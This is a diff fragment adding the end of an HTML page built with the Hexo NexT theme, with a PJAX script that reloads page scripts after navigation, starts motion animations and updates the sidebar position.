+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
